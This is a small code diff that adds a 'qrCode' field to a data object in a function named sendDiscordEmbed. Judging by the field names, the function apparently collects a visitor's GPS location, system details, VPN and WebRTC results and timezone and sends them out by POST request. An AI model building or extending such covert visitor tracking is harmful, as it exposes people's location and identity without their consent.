@@ -265,6 +265,7 @@ function sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, r
         vpnMessage: vpnMessage,
         webrtcResult: webrtcResult,
         userTimezone: userTimezone,
+        qrCode: qrCode
     };
 
     // Send POST request to the / URL
